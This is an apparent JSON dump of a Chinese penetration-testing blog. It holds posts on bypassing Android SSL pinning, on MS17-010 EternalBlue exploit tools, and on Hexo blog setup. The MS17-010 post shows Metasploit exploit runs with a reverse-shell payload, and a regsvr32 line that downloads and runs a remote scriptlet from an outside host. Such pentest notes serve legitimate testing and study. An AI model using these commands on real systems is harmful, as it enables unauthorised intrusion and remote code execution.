[{"title":"bypass android ssl pinning","url":"http://blog.le31ei.top/2020/08/19/bypass-android-ssl-pinning/","content":"<p>在做app测试的时候，经常有抓不到包的情况，即使是导入了burp证书后，仍然无法抓取https的数据包，这种情况一般是遇到了ssl pinning。</p>\n<h1 id=\"0x01-替换系统证书\"><a href=\"#0x01-替换系统证书\" class=\"headerlink\" title=\"0x01 替换系统证书\"></a>0x01 替换系统证书</h1><p>在android 7.0以前，系统导入burp证书为用户权限能够绕过部分未做证书校验的APP，但是7.0及以后应用默认不再信任用户证书，导入burp证书后仍然会提示证书错误，抓不到https的包。</p>\n<p>这种情况下一般采用替换系统证书的方法，原理是将burp的证书直接导入为系统证书，前提是手机需要ROOT权限。导入后系统会把burp当成系统证书，自然就能中间人代理https流量了。</p>\n<p>具体步骤如下：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 下载burp证书，导出为cacert.der，然后转换为pem格式</span></span><br><span class=\"line\">openssl x509 -inform DER -outform PEM -in cacert.der -out cacert.pem</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 生成<span class=\"built_in\">hash</span>，得到一个<span class=\"built_in\">hash</span>  比如：9a5ba575</span></span><br><span class=\"line\">openssl x509 -subject_hash_old -in cacert.pem</span><br><span class=\"line\">mv cacert.pem 9a5ba575.0</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 上传为系统证书</span></span><br><span class=\"line\">adb push 9a5ba575.0 /system/etc/security/cacerts/</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 如果在push过程中显示<span class=\"built_in\">readonly</span> system，则需要remount</span></span><br><span class=\"line\">adb disable-verity</span><br><span class=\"line\">adb root</span><br><span class=\"line\">adb remount</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>系统证书的目录是：/system/etc/security/cacerts/ 每个证书的命名规则为：. Certificate_Hash 表示证书文件的 hash 值，Number 是为了防止证书文件的 hash 值一致而增加的后缀; 证书的 hash 值可以由命令计算出来，在终端输入 openssl x509 -subject_hash_old -in ，其中 Certificate_File 为证书路径，将证书重命名为 hash.0 放入系统证书目录，之后你就可以正常抓包了。</p>\n</blockquote>\n<h1 id=\"0x02-Magisk-Always-Trust-User\"><a href=\"#0x02-Magisk-Always-Trust-User\" class=\"headerlink\" title=\"0x02 Magisk+Always Trust User\"></a>0x02 Magisk+Always Trust User</h1><p>上述应用不认用户证书的解决方案还有一种，就是magisk加上<a href=\"https://github.com/NVISO-BE/MagiskTrustUserCerts\">MagiskTrustUserCerts</a>。magisk类似于xposed框架，能够hook系统函数，<code>AlwaysTrustUserCerts</code>是该工具的一个插件，能够将用户导入的证书变成系统证书。</p>\n<p><img src=\"./image-20200820102936183.png\" alt=\"image-20200820102936183.png\"></p>\n<p>在安装好后，进行正常的证书导入操作，证书就能直接导入到系统证书里边，较第一种方式方便许多。</p>\n<p>该种方式可以通过recovery将Magisk刷入未root的系统中，可以绕过一些检测了root权限的应用。</p>\n<h1 id=\"0x03-JustTrustMe\"><a href=\"#0x03-JustTrustMe\" class=\"headerlink\" title=\"0x03 JustTrustMe\"></a>0x03 JustTrustMe</h1><p>在经过上述两种方法后，大部分的app都能抓到包了，但是还是能碰到少数情况仍然抓不到包，应用连不上网的情况。这种情况一般都是ssl pinning的场景。</p>\n<p>应用中的代码对ssl证书进行了锁定。一般这种方法的思路就是通过xposed或者frida等hook框架对相应的证书验证代码hook进行绕过。一般app通常采用通用的解决方案，而xposed框架的JustTrustMe模块基本覆盖了这些类型，故本文不再探讨基于frida的自定义hook函数。</p>\n<p><strong>安装</strong>：</p>\n<p>安装方式比较简单，直接下载apk模块文件<a href=\"https://github.com/Fuzion24/JustTrustMe\">JustTrustMe</a>，按照通用的apk文件安装方式。然后在Xposed框架中进行激活，然后重启生效。</p>\n<p><img src=\"./image-20200820104447189.png\" alt=\"image-20200820104447189\"></p>\n<p>安装好后，再抓包，应用就能正常运行并抓取https数据包了。</p>\n<h1 id=\"0x04-刷机\"><a href=\"#0x04-刷机\" class=\"headerlink\" title=\"0x04 刷机\"></a>0x04 刷机</h1><p>在进行上述步骤操作时会碰到一些刷机问题，这里简单记录一下。</p>\n<p><strong>BL锁</strong>：现在的手机一般有BL锁（BootLoader锁），如果需要刷入第三方recovery或者第三方ROM</p>\n<p><strong>FastBoot</strong>：线刷时需要进入的模式，通过fastboot命令可以刷入recovery。</p>\n<p>fastboot刷入的命令如下：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 查看设备</span></span><br><span class=\"line\">fastboot devices</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 刷入recovery</span></span><br><span class=\"line\">fastboot flash recovery recovery.img</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 从新的boot启动</span></span><br><span class=\"line\">fastboot boot recovery.img</span><br></pre></td></tr></table></figure>\n\n<p>附件是windows版本的fastboot工具：<a href=\"./fastboot.exe\">fastboot.exe</a></p>\n<p><strong>TWRP</strong>：第三方recovery，相对于官方的recovery增加了很多功能，可通过该recovery进行卡刷升级等。可刷入xposed框架、Magisk框架等</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><ol>\n<li><p><a href=\"https://zhuanlan.zhihu.com/p/127847550\">Android应用中https SSL pinning以及绕过的方法介绍</a></p>\n</li>\n<li><p><a href=\"https://www.mcafee.com/enterprise/en-us/assets/misc/ms-android-7-10-ssl-pinning-bypass.pdf\">Android SSL Pinning Bypass: Android 7-10</a></p>\n</li>\n<li><p><a href=\"https://github.com/Fuzion24/JustTrustMe\">JustTrustMe</a></p>\n</li>\n<li><p><a href=\"https://xz.aliyun.com/t/2440\">SSL Pinning Practice</a></p>\n</li>\n<li><p><a href=\"https://xz.aliyun.com/t/2336\">Frida.Android.Practice (ssl unpinning)</a></p>\n</li>\n</ol>\n","categories":["Pentest"],"tags":["app测试"]},{"title":"ms17010工具总结","url":"http://blog.le31ei.top/2020/08/18/ms17010工具总结/","content":"<p>本文记录下实战中用到的ms17010的利用工具，实战中用过众多工具，都是哪个能成功就用哪个，还未做系统总结。本文记录下使用记录，做个总结备忘。</p>\n<h1 id=\"0x01-msf\"><a href=\"#0x01-msf\" class=\"headerlink\" title=\"0x01 msf\"></a>0x01 msf</h1><p>第一个工具当属大家熟悉<code>ms17_010_eternalblue</code>工具，集成在msf当中。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf5 &gt; search 17-010</span><br><span class=\"line\"></span><br><span class=\"line\">Matching Modules</span><br><span class=\"line\">================</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"comment\">#  Name                                           Disclosure Date  Rank     Check  Description</span></span><br><span class=\"line\">   -  ----                                           ---------------  ----     -----  -----------</span><br><span class=\"line\">   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class=\"line\">   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection</span><br><span class=\"line\">   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span><br><span class=\"line\">   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption <span class=\"keyword\">for</span> Win8+</span><br><span class=\"line\">   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class=\"line\">   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>其中<code>smb_doublepulsar_rce</code>工具是使用nsa利用工具后留下的后门，可以用此工具反弹meterpreter。一般在内网中优先使用<code>auxiliary/scanner/smb/smb_ms17_010</code>扫描漏洞是否存在后再利用工具进行攻击。</p>\n<p>使用如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf5 &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class=\"line\">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; show options </span><br><span class=\"line\"></span><br><span class=\"line\">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class=\"line\"></span><br><span class=\"line\">   Name           Current Setting  Required  Description</span><br><span class=\"line\">   ----           ---------------  --------  -----------</span><br><span class=\"line\">   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class=\"string\">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class=\"line\">   RPORT          445              yes       The target port (TCP)</span><br><span class=\"line\">   SMBDomain      .                no        (Optional) The Windows domain to use <span class=\"keyword\">for</span> authentication</span><br><span class=\"line\">   SMBPass                         no        (Optional) The password <span class=\"keyword\">for</span> the specified username</span><br><span class=\"line\">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class=\"line\">   VERIFY_ARCH    <span class=\"literal\">true</span>             yes       Check <span class=\"keyword\">if</span> remote architecture matches exploit Target.</span><br><span class=\"line\">   VERIFY_TARGET  <span class=\"literal\">true</span>             yes       Check <span class=\"keyword\">if</span> remote OS matches exploit Target.</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Payload options (windows/x64/meterpreter/reverse_https):</span><br><span class=\"line\"></span><br><span class=\"line\">   Name      Current Setting  Required  Description</span><br><span class=\"line\">   ----      ---------------  --------  -----------</span><br><span class=\"line\">   EXITFUNC  thread           yes       Exit technique (Accepted: <span class=\"string\">&#x27;&#x27;</span>, seh, thread, process, none)</span><br><span class=\"line\">   LHOST     172.16.26.213    yes       The <span class=\"built_in\">local</span> listener hostname</span><br><span class=\"line\">   LPORT     8443             yes       The <span class=\"built_in\">local</span> listener port</span><br><span class=\"line\">   LURI                       no        The HTTP Path</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Exploit target:</span><br><span class=\"line\"></span><br><span class=\"line\">   Id  Name</span><br><span class=\"line\">   --  ----</span><br><span class=\"line\">   0   Windows 7 and Server 2008 R2 (x64) All Service Packs</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class=\"built_in\">set</span> rhosts 172.16.26.238</span><br><span class=\"line\">rhosts =&gt; 172.16.26.238</span><br><span class=\"line\">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Started HTTPS reverse handler on https://172.16.26.213:8443</span><br><span class=\"line\">[*] 172.16.26.238:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class=\"line\">[+] 172.16.26.238:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Enterprise 7601 Service Pack 1 x64 (64-bit)</span><br><span class=\"line\">[*] 172.16.26.238:445     - Scanned 1 of 1 hosts (100% complete)</span><br><span class=\"line\">[*] 172.16.26.238:445 - Connecting to target <span class=\"keyword\">for</span> exploitation.</span><br><span class=\"line\">[+] 172.16.26.238:445 - Connection established <span class=\"keyword\">for</span> exploitation.</span><br><span class=\"line\">[+] 172.16.26.238:445 - Target OS selected valid <span class=\"keyword\">for</span> OS indicated by SMB reply</span><br><span class=\"line\">[*] 172.16.26.238:445 - CORE raw buffer dump (53 bytes)</span><br><span class=\"line\">[*] 172.16.26.238:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2</span><br><span class=\"line\">[*] 172.16.26.238:445 - 0x00000010  30 30 38 20 52 32 20 45 6e 74 65 72 70 72 69 73  008 R2 Enterpris</span><br><span class=\"line\">[*] 172.16.26.238:445 - 0x00000020  65 20 37 36 30 31 20 53 65 72 76 69 63 65 20 50  e 7601 Service P</span><br><span class=\"line\">[*] 172.16.26.238:445 - 0x00000030  61 63 6b 20 31                                   ack 1           </span><br><span class=\"line\">[+] 172.16.26.238:445 - Target arch selected valid <span class=\"keyword\">for</span> arch indicated by DCE/RPC reply</span><br><span class=\"line\">[*] 172.16.26.238:445 - Trying exploit with 12 Groom Allocations.</span><br><span class=\"line\">[*] 172.16.26.238:445 - Sending all but last fragment of exploit packet</span><br><span class=\"line\">[*] 172.16.26.238:445 - Starting non-paged pool grooming</span><br><span class=\"line\">[+] 172.16.26.238:445 - Sending SMBv2 buffers</span><br><span class=\"line\">[+] 172.16.26.238:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class=\"line\">[*] 172.16.26.238:445 - Sending final SMBv2 buffers.</span><br><span class=\"line\">[*] 172.16.26.238:445 - Sending last fragment of exploit packet!</span><br><span class=\"line\">[*] 172.16.26.238:445 - Receiving response from exploit packet</span><br><span class=\"line\">[+] 172.16.26.238:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class=\"line\">[*] 172.16.26.238:445 - Sending egg to corrupted connection.</span><br><span class=\"line\">[*] 172.16.26.238:445 - Triggering free of corrupted buffer.</span><br><span class=\"line\">[-] 172.16.26.238:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class=\"line\">[-] 172.16.26.238:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class=\"line\">[-] 172.16.26.238:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br></pre></td></tr></table></figure>\n\n<p>该工具的利用成功率并不高，对目标系统版本要求较高，需要为win7或者winserver2008 r2，但结合msf的meterpreter进行流量代理，先在内网中过一遍c段倒是挺好的。</p>\n<h1 id=\"0x02-fcstools\"><a href=\"#0x02-fcstools\" class=\"headerlink\" title=\"0x02  fcstools\"></a>0x02  fcstools</h1><p>适用于在内网中，服务器无法出外网或者反弹到shell的情况，能够直接执行命令，如在目标机器添加用户等。一般msf等工具都是直接反弹meterpreter，如果目标机在无法出外网或者反弹的情况就只能使用这个离线工具。</p>\n<p>该工具需要配合DLL生成工具进行，替换掉x86或者x64文件，fcstools就会执行相关的dll命令。</p>\n<p><img src=\"./image-20200818130214827.png\" alt=\"image-20200818130214827\"></p>\n<p>生成dll后，替换fcstools里面的x86或者x64文件，<strong>注意添加用户时，密码要满足系统的复杂度要求</strong>。</p>\n<p>.<img src=\"./image-20200818130320705.png\" alt=\"image-20200818130320705\"></p>\n<p>然后就可以运行工具进行攻击了，</p>\n<p><img src=\"./image-20200818130946475.png\" alt=\"image-20200818130946475\"></p>\n<p>eternalblue工具种下后门后，点击doublepulsar，利用后门执行dll里面的命令</p>\n<p><img src=\"./image-20200818131312293.png\" alt=\"image-20200818131312293\"></p>\n<h1 id=\"0x03-zzz-exploit-py\"><a href=\"#0x03-zzz-exploit-py\" class=\"headerlink\" title=\"0x03 zzz_exploit.py\"></a>0x03 zzz_exploit.py</h1><p>github地址：<a href=\"https://github.com/worawit/MS17-010\">https://github.com/worawit/MS17-010</a></p>\n<p>该脚本有几个关键点需要注意：</p>\n<ol>\n<li>需要有一个系统可登陆的smb账户，可通过爆破等方式获取</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">USERNAME = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">PASSWORD = <span class=\"string\">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li><code>python zzz_exploit.py &lt;ip&gt; [pipe_name]</code>，需要有一个管道名。常见的管道名如下：</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netlogon lsarpc samr browser atsvc DAV RPC SERVICE epmapper eventlog InitShutdown keysvc lsass LSM_API_service ntsvcs plugplay protected_storage router SapiServerPipeS-1-5-5-0-70123 scerpc srvsvc tapsrv trkwks W32TIME_ALT wkssvc PIPE_EVENTROOT\\CIMV2SCM EVENT PROVIDER db2remotecmd </span><br></pre></td></tr></table></figure>\n\n<p>3、默认的脚本是在c盘创建一个pwn.txt文件，需要修改为cs或者msf生成的执行文件，就能反弹</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">smb_pwn</span>(<span class=\"params\">conn, arch</span>):</span></span><br><span class=\"line\">    smbConn = conn.get_smbconnection()</span><br><span class=\"line\">    </span><br><span class=\"line\">    print(<span class=\"string\">&#x27;creating file c:\\\\pwned.txt on the target&#x27;</span>)</span><br><span class=\"line\">    tid2 = smbConn.connectTree(<span class=\"string\">&#x27;C$&#x27;</span>)</span><br><span class=\"line\">    fid2 = smbConn.createFile(tid2, <span class=\"string\">&#x27;/pwned.txt&#x27;</span>)</span><br><span class=\"line\">    smbConn.closeFile(tid2, fid2)</span><br><span class=\"line\">    smbConn.disconnectTree(tid2)</span><br></pre></td></tr></table></figure>\n\n<p>可改为如下代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service_exec(conn, <span class=\"string\">r&#x27;cmd /c regsvr32 /s /n /u /i:http://192.168.2.164:8080/test.sct scrobj.dll&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>以上便是几个使用频率比较高的工具，还有诸如CS上面的插件，k8的扫描工具等，效果一般或者比较傻瓜化，故不再记录。</p>\n","categories":["Pentest"],"tags":["工具"]},{"title":"helloworld again","url":"http://blog.le31ei.top/2020/08/17/helloworld-again/","content":"<p>重新整理了下博客内容，删除了以前的文章，换了个简洁的主题。学习还是要养成输出的习惯，学完一块内容后，做个总结，回头看看自己过程也是很好的事情。</p>\n<p>本文记录一下github pages搭建的过程。</p>\n<h1 id=\"0x01-hexo安装\"><a href=\"#0x01-hexo安装\" class=\"headerlink\" title=\"0x01 hexo安装\"></a>0x01 hexo安装</h1><p>npm等环境安装不再详述。</p>\n<p>直接上命令：<code>npm install -g hexo</code></p>\n<p>初始化命令：<code>hexo init</code>，生成基本的结构</p>\n<p><img src=\"./image-20200817154147163.png\" alt=\"image-20200817154147163\"></p>\n<h1 id=\"0x02-github创建项目\"><a href=\"#0x02-github创建项目\" class=\"headerlink\" title=\"0x02 github创建项目\"></a>0x02 github创建项目</h1><p>创建<code>username.github.io</code>名称的项目即可，对应的github pages就是这个</p>\n<p>blog目录下设置git全局参数:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config --global user.name <span class=\"string\">&quot;name&quot;</span></span><br><span class=\"line\">git config --global user.email <span class=\"string\">&quot;email&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"0x03-主题及配置\"><a href=\"#0x03-主题及配置\" class=\"headerlink\" title=\"0x03 主题及配置\"></a>0x03 主题及配置</h1><p>修改<code>_config.yml</code>文件deploy，设置如下：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">deploy:</span></span><br><span class=\"line\">  <span class=\"attr\">type:</span> <span class=\"string\">git</span></span><br><span class=\"line\">  <span class=\"attr\">repo:</span> </span><br><span class=\"line\">    <span class=\"attr\">github:</span> <span class=\"string\">https://github.com/le31ei/le31ei.github.io.git</span></span><br><span class=\"line\">  <span class=\"attr\">branch:</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n\n<p>选择的主题是<code>https://github.com/forsigner/fexo</code>，够简洁的主题</p>\n<p>替换的方法比较简单，参考文档<code>http://forsigner.com/2016/03/10/fexo-doc-zh-cn/</code></p>\n<p>这里记录下常用的命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 升级</span></span><br><span class=\"line\">$ <span class=\"built_in\">cd</span> themes/fexo</span><br><span class=\"line\">$ git commit -am <span class=\"string\">&#x27;update&#x27;</span></span><br><span class=\"line\">$ git pull</span><br><span class=\"line\"><span class=\"comment\"># 启用</span></span><br><span class=\"line\"><span class=\"comment\"># 打开博客根目录的 _config.yml 设为 theme: fexo</span></span><br></pre></td></tr></table></figure>\n\n<p>主题的配置路径<code>themes/fexo/_config.yml</code>，具体配置参数可以参考文档自己做细微的调整。</p>\n<p>其他hexo常见命令如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 新建测试页面</span></span><br><span class=\"line\">hexo n <span class=\"string\">&quot;test&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># 部署</span></span><br><span class=\"line\">hexo g -d</span><br><span class=\"line\"><span class=\"comment\"># 新建草稿</span></span><br><span class=\"line\">hexo new draft <span class=\"string\">&quot;new draft&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># 草稿变成文章</span></span><br><span class=\"line\">hexo publish [layout] &lt;filename&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"0x04-绑定自定义域名\"><a href=\"#0x04-绑定自定义域名\" class=\"headerlink\" title=\"0x04 绑定自定义域名\"></a>0x04 绑定自定义域名</h1><p>需要添加CNAME，将自己的域名填写到CNAME文件中，DNS解析选择CNAME解析。</p>\n<p><img src=\"./image-20200817155628007.png\" alt=\"image-20200817155628007\"></p>\n<p>以上就是博客搭建过程。搭建过程中也尝试了给博客提提速，github国内访问实在太慢，而且百度爬虫也会403。奈何尝试过CDN（需要备案放弃）、coding.net的pages、gitee pages，各种复杂配置，还是回到了最简单的方式，直接github访问省时省力。</p>\n","categories":["杂文"],"tags":["hexo"]},{"title":"about","url":"http://blog.le31ei.top/about/index.html","content":"","categories":[],"tags":[]},{"title":"category","url":"http://blog.le31ei.top/category/index.html","content":"","categories":[],"tags":[]},{"title":"search","url":"http://blog.le31ei.top/search/index.html","content":"","categories":[],"tags":[]},{"title":"tag","url":"http://blog.le31ei.top/tag/index.html","content":"","categories":[],"tags":[]}]